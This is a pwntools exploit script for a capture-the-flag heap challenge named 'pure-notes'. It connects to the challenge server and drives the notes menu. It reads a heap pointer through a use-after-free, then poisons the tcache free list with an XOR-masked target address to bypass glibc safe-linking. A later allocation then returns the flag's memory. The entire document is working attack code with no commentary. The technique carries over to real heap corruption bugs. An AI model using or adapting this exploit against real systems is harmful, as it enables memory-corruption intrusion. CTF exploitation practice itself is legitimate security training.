from pwn import *

HOST, PORT = 'pure-notes-16d4b293d7acec0b-global.challs.brunnerne.xyz', 1337
r = remote(HOST, PORT, ssl=True)
# HOST, PORT = '0.0.0.0', 31337
# r = remote(HOST, PORT)

def new(name, size):
    r.sendlineafter(b'> ', ('new %s %d' % (name, size)).encode())

def write(name, content):
    r.sendlineafter(b'> ', ('write %s %s' % (name, content)).encode())

def writehex(name, content):
    r.sendlineafter(b'> ', ('writehex %s %s' % (name, content)).encode())

def view(name):
    r.sendlineafter(b'> ', ('view %s' % name).encode())

def delete(name):
    r.sendlineafter(b'> ', ('delete %s' % name).encode())

def list():
    r.sendlineafter(b'> ', b'list')

def exit():
    r.sendlineafter(b'> ', b'exit')

r.recvuntil(b'program\n')
flag=int(r.recvline().decode().strip(),16)-0x10
print(hex(flag)) # 0x4200504320
new('a', 0x100)
delete('a')
view('a')
leak=u64(r.recv(8).ljust(8, b'\x00'))
new('b', 0x100)
new('c', 0x100)
delete('b')
delete('c')
writehex('c', p64(flag^leak).hex())
new('d', 0x100)
new('e', 0x100)
view('e')

r.interactive()